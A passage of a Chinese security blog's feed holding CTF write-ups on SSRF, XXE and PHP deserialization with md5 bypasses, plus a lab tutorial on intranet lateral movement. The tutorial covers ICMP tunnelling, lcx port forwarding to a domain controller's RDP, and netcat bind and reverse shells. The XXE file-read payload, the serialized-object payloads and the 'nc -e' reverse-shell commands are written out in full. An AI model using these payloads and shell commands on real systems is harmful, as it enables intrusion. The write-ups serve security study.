title="0x04 端口扫描"></a>0x04 端口扫描</h2><p>给出提示端口范围在8000-9000</p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721100553224.png" alt="image-20220721100553224"></p><p>根据提示，flag应该实在某一个端口下，因此就需要爆破每一个端口来探测，这里使用BP直接进行爆破：</p><p>这里利用<strong>dict协议</strong>探测端口加上<strong>burp</strong>爆破，也可以用<strong>http</strong>探测端口。</p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721101114833.png" alt="image-20220721101114833"></p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721101140417.png" alt="image-20220721101140417"></p><p>爆破完成，只有一个长度不同：</p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721101359755.png" alt="image-20220721101359755"></p><p>使用http协议访问：</p><p>​<img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721101453963.png" alt="image-20220721101453963"></p><p>得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-XXE</title>
      <link href="/2022/07/19/BUU-XXE/"/>
      <url>/2022/07/19/BUU-XXE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU一道基础XXE题目。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>打开靶场出现登录界面：</p><p><img src="/2022/07/19/BUU-XXE/image-20220719215715674.png" alt="image-20220719215715674"></p><p>随便登录抓包观察数据包：<br><img src="/2022/07/19/BUU-XXE/image-20220719215812408.png" alt="image-20220719215812408"></p><p>发现数据包中有xml 文档声明：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此，可能存在xxe漏洞。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>构造payload：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;root&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;2333&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;    &lt;!--使用admin实体--&gt;&lt;!DOCTYPE root[&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;                        &lt;!--声明admin实体--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入。</p><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。<br>因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过<strong>引用</strong>定义在<strong>外部的 DTD 中的实体</strong>，我们称之为外部实体) 来访问我们 的 flag；</p><p>我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件造成漏洞，这就是xxe漏洞。</p></blockquote><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>执行payload得到flag：</p><p><img src="/2022/07/19/BUU-XXE/image-20220719220251958.png" alt="image-20220719220251958"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/m0_62879498/article/details/123750846">https://blog.csdn.net/m0_62879498/article/details/123750846</a></p>]]></content>
      
      
      <categories>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-CODE-REVIEW</title>
      <link href="/2022/07/19/BUU-CODE-REVIEW/"/>
      <url>/2022/07/19/BUU-CODE-REVIEW/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU基础题，代码审计和PHP反序列化。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">BUU</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$correct</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>           <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">correct</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">correct</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pleaseget'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pleasepost'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'2'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md51'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md52'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md51'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md52'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'obj'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一层是GET，POST传参；</p><p>第二层是md5绕过；</p><p>第三层是php反序列化</p><p><code>最后一步php反序列化需要满足$this-&gt;correct === $this-&gt;input</code><br><code>因为每次都会执行$this-&gt;correct = base64_encode(uniqid());，所以我们不能将input设为具体的值，而是在序列化执行时，令input=&amp;correct</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>序列化对象：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">BUU</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$correct</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BUU</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">input</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">correct</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>得到字符串：<br>O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}</p></blockquote><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">GET传参?pleaseget&#x3D;1POST传参pleasepost&#x3D;2&amp;md51[]&#x3D;1&amp;md52[]&#x3D;2&amp;obj&#x3D;O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;或者pleasepost&#x3D;2&amp;md51&#x3D;QNKCDZO&amp;md52&#x3D;s155964671a&amp;obj&#x3D;O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一种使用的是md5数组绕过；第二种使用的是md50e绕过。</p><p><img src="/2022/07/19/BUU-CODE-REVIEW/image-20220719105204800.png" alt="image-20220719105204800"></p><p><img src="/2022/07/19/BUU-CODE-REVIEW/image-20220719105225585.png" alt="image-20220719105225585"></p><h2 id="0x03-md5数组绕过和0e绕过"><a href="#0x03-md5数组绕过和0e绕过" class="headerlink" title="0x03 md5数组绕过和0e绕过"></a>0x03 md5数组绕过和0e绕过</h2><p>###0x00 数组绕过</p><p><strong>md5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null。</strong></p><blockquote><p> 比如将两个数组的md5值进行比较</p><p>md5(a[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b[]&#x3D;1)</p></blockquote><blockquote><p>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样</p><p>null &#x3D;&#x3D;&#x3D; null<br>结果返回true,也就是说数组的md5值进行比较时,结果相等</p></blockquote><p><strong>需要注意的是<code>0e绕过</code>只能绕过弱类型比较(&#x3D;&#x3D;),而数组绕过不只可以绕过弱类型比较,还可以绕过强类型比较(&#x3D;&#x3D;&#x3D;)</strong></p><blockquote><p>弱类型比较(&#x3D;&#x3D;),只判断内容是否相等,如果是字符串类型,则转换成数值型后进行判断</p><p>强类型比较(&#x3D;&#x3D;&#x3D;),判断内容的基础上,还会判断类型是否相同</p></blockquote><h3 id="0x01-0e绕过"><a href="#0x01-0e绕过" class="headerlink" title="0x01 0e绕过"></a>0x01 0e绕过</h3><p><strong>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</strong></p><blockquote><p> 比如将两个md5值进行弱类型比较</p><p>md5(‘QNKCDZO’) &#x3D;&#x3D; md5(240610708)<br>MD5加密后会变成这个样子：</p><p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854<br>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样：</p><p>0 &#x3D;&#x3D; 0</p></blockquote><p><strong>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</strong></p><blockquote><p>常用的MD5加密后以0e开头的有：</p><p>QNKCDZO<br>240610708<br>byGcY<br>sonZ7y<br>aabg7XSs<br>aabC9RqS<br>s878926199a<br>s155964671a<br>s214587387a<br>s1091221200a</p></blockquote><p>还有其他的md5绕过方式，可以自行百度，这里只介绍用到的方法。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>最重要的时代码审计，明白每一层的绕过思路，第一层GET和POST传参绕过，第二层md5弱碰撞或者使用php弱类型绕过；还有需要注意的一个点是<code>$this-&gt;correct = base64_encode(uniqid());</code></p><p>由于<code>$this-&gt;correct</code>每次都需要<code>base64</code>加密，因此进行序列化操作时<code>input</code>值就不能作为常量，需要作为变量，就需要令<code>input=&amp;correct</code>，使得<code>$this-&gt;correct === $this-&gt;input</code>恒满足。</p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全-域横向渗透【六】</title>
      <link href="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/"/>
      <url>/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E7%A9%BF%E9%80%8F-16581103252421.png" alt="横向渗透-穿透"></p><h2 id="0x01-知识点"><a href="#0x01-知识点" class="headerlink" title="0x01 知识点"></a>0x01 知识点</h2><h3 id="0x00-代理和隧道技术区别"><a href="#0x00-代理和隧道技术区别" class="headerlink" title="0x00 代理和隧道技术区别"></a>0x00 代理和隧道技术区别</h3><p>隧道和代理的区别是：代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知代理内部的设备。隧道是一个虚拟的路径，用来使到达隧道入口的数据，穿越原本不方便穿越的网络，到达另一侧出口。</p><p>1、代理</p><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端的“中间人”。通过代理不会改变原本的URI，每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息</p><p>使用理由:利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。</p><p>2、隧道</p><p>隧道是远距离的服务器和客户端之间的中转站。隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</p><p><strong>3、总结</strong></p><p><strong>代理主要解决网络访问通讯问题（从一个内网到另一个内网）。</strong></p><p><strong>隧道技术解决在代理基础之上通讯受阻的问题（被防火墙等检测拦截），达到绕过过滤限制等。</strong></p><h3 id="0x01-隧道技术作用"><a href="#0x01-隧道技术作用" class="headerlink" title="0x01 隧道技术作用"></a>0x01 隧道技术作用</h3><p>用单独的通道来传输被拦截的数据。</p><p>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等。 </p><h3 id="0x02-常见隧道技术"><a href="#0x02-常见隧道技术" class="headerlink" title="0x02 常见隧道技术"></a>0x02 常见隧道技术</h3><p>网络层：IPv6隧道、ICMP隧道</p><p>传输层：TCP隧道、UDP隧道、常规端口转发</p><p>应用层：SSH隧道、HTTP&#x2F;S隧道、DNS隧道 </p><p>（使用隧道之前检测是否可以使用协议）</p><h2 id="0x02-网络传输应用层连通性检测"><a href="#0x02-网络传输应用层连通性检测" class="headerlink" title="0x02 网络传输应用层连通性检测"></a>0x02 网络传输应用层连通性检测</h2><h3 id="0x00-TCP协议"><a href="#0x00-TCP协议" class="headerlink" title="0x00 TCP协议"></a>0x00 TCP协议</h3><p>用“瑞士军刀”——netcat</p><p>执行 nc 命令：<code>nc &lt;IP&gt; &lt;端口&gt;</code></p><p>###0x01 HTTP 协议</p><p>用“curl”工具，执行 curl &lt;IP 地址:端口&gt;命令。如果远程主机开启了相应的端口，且内网可连接外网的</p><p>话，就会输出相应的端口信息</p><p>###0x02 ICMP 协议</p><p>用“ping”命令，执行 ping &lt;IP 地址&#x2F;域名&gt;</p><p>###0x03 DNS 协议</p><p>检测 DNS 连通性常用的命令是“nslookup”和“dig”</p><p>nslookup 是 windows 自带的 DNS 探测命令</p><p>dig 是 linux 系统自带的 DNS 探测命令</p><h2 id="0x03-网络层ICMP隧道ptunnel使用-检测-利用"><a href="#0x03-网络层ICMP隧道ptunnel使用-检测-利用" class="headerlink" title="0x03 网络层ICMP隧道ptunnel使用-检测,利用"></a>0x03 网络层ICMP隧道ptunnel使用-检测,利用</h2><h3 id="0x00-pingtunnel介绍"><a href="#0x00-pingtunnel介绍" class="headerlink" title="0x00 pingtunnel介绍"></a>0x00 pingtunnel介绍</h3><p>下载地址：</p><p>老版本介绍：<a href="https://github.com/f1vefour/ptunnel(%E9%9C%80%E8%87%AA%E8%A1%8C%E7%BC%96%E8%AF%91)">https://github.com/f1vefour/ptunnel(需自行编译)</a><br>新版本介绍：<a href="https://github.com/esrrhs/pingtunnel(%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E7%89%88)">https://github.com/esrrhs/pingtunnel(二次开发版)</a></p><blockquote><p>pingtunnel 是把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具</p><p>-p ##表示连接 icmp 隧道另一端的机器 IP（即目标服务器）</p><p>-lp ##表示需要监听的本地 tcp 端口</p><p>-da ##指定需要转发的机器的 IP（即目标内网某一机器的内网 IP）</p><p>-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</p><p>-x ##设置连接的密码</p></blockquote><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>在webserver主机执行以下命令：（实战中需要将ptunnel上传至webserver主机）</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;ptunnel -x xiaodi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>xiaodi是隧道密码，防止其他任意连接可以连接到此隧道，设置密码为了只能我们自己连接</p></blockquote><p>此时就是构建隧道密码就是xiaodi，执行完命令之后就处于监听状态，等待别人连接；</p><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718191121515.png" alt="image-20220718191121515"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><pre class="line-numbers language-none"><code class="language-none">kali处执行命令：.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过密码对webserver主机建立连接，并通过webserver主机去访问DC主机的3389远程桌面端口，将数据转发给本地kali的1080端口。</p><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718191235630.png" alt="image-20220718191235630"></p><p>kali连接本地的1080端口：</p><p>使用rdesktop命令连接自己本地的1080端口：</p><p>（因为1080端口接收了DC主机3389端口返回的数据，所以可直接连接上DC的远程桌面）</p><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718191548115.png" alt="image-20220718191548115"></p><p>弹出登录框：</p><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718191745441.png" alt="image-20220718191745441"></p><p>此时数据流量使用的不是3389对应的远程桌面服务，而是ICMP协议。</p><blockquote><p>原理：</p><p>防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，</p><p>与对方进行通信。</p></blockquote><h2 id="0x04-传输层转发隧道Portmap使用"><a href="#0x04-传输层转发隧道Portmap使用" class="headerlink" title="0x04 传输层转发隧道Portmap使用"></a>0x04 传输层转发隧道Portmap使用</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>端口转发工具：</p><p>windows: lcx</p><p>linux：portmap</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>在DC上执行以下命令，将本地3389给webserver的6666</p><pre class="line-numbers language-none"><code class="language-none">Lcx.exe -slave 192.168.3.31 6666 127.0.0.1 3389 &#x2F;&#x2F;将本地3389给webserver的6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718193753109.png" alt="image-20220718193753109"></p><p>在webserver上执行以下命令，监听6666端口流量并转发至7777</p><pre class="line-numbers language-none"><code class="language-none">Lcx.exe -listen 6666 7777   &#x2F;&#x2F; 监听6666转发至7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718193830663.png" alt="image-20220718193830663"></p><p>在kali上执行以下命令，连接webserver的7777，登录远程桌面访问，这里其实登录的是域控DC的远程桌面。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rdesktop <span class="token number">192.168</span>.80.146:7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>DC 把本地的3389 转播到 webserver的6666端口 ，而webserver又把6666转到自己的7777 端口。</p><p><strong>那么当kali去rdesktop访问webserver的7777端口时，就是连接的DC的远程桌面。</strong></p></blockquote><h2 id="0x05-传输层转发隧道-Netcat-使用-检测-利用-功能"><a href="#0x05-传输层转发隧道-Netcat-使用-检测-利用-功能" class="headerlink" title="0x05 传输层转发隧道 Netcat 使用-检测,利用,功能"></a>0x05 传输层转发隧道 Netcat 使用-检测,利用,功能</h2><h3 id="0x00-双向连接反弹shell"><a href="#0x00-双向连接反弹shell" class="headerlink" title="0x00 双向连接反弹shell"></a>0x00 双向连接反弹shell</h3><p><strong>正向反弹 shell 攻击机连接受害机</strong> </p><p>受害机DC执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">nc -ldp 1234 -e &#x2F;bin&#x2F;sh #linuxnc -ldp 1234 -e c:\windows\system32\cmd.exe #windows#将自身的shell反弹至对应端口，这里是1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718202212115.png" alt="image-20220718202212115"></p><p>攻击主机webserver执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">nc 192.168.3.21 1234 #使用nc主动连接受害主机<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718202505359.png" alt="image-20220718202505359"></p><p>查看IP可以看到连接到受害主机。</p><p><strong>反向反弹shell 受害机连接攻击机</strong></p><pre class="line-numbers language-none"><code class="language-none">nc 192.168.3.31 1234 -e c:\windows\system32\cmd.exe #windowsnc 192.168.3.31 1234 -e &#x2F;bin&#x2F;sh #linux受害主机主动将数据发送给攻击主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>攻击机监听1234端口：</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718203329319.png" alt="image-20220718203329319"></p><p>受害主机主动发送数据给攻击主机：</p><pre class="line-numbers language-none"><code class="language-none">nc 192.168.3.31 1234 -e c:\windows\system32\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718203419189.png" alt="image-20220718203419189"></p><p>可以看到反弹回受害主机的shell：</p><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718203454601.png" alt="image-20220718203454601"></p><blockquote><p>注意：<br>受害主机能找到攻击主机就使用反向，受害主机找不到攻击主机就使用正向。</p></blockquote><p>###0x01 多向连接反弹 shell</p><p>使用lcx.exe监听本地2222端口给到3333端口：</p><pre class="line-numbers language-none"><code class="language-none">lcx.exe -listen 2222 3333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718204138419.png" alt="image-20220718204138419"></p><p>使用nc反向连接到攻击主机webserver</p><pre class="line-numbers language-none"><code class="language-none">nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718204618158.png" alt="image-20220718204618158"></p><p>在攻击主机出查看接收到来自192.168.3.32:2222的数据：</p><p><img src="/2022/07/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91/image-20220718204609415.png" alt="image-20220718204609415"></p><p>之后再使用kali主机执行：</p><pre class="line-numbers language-none"><code 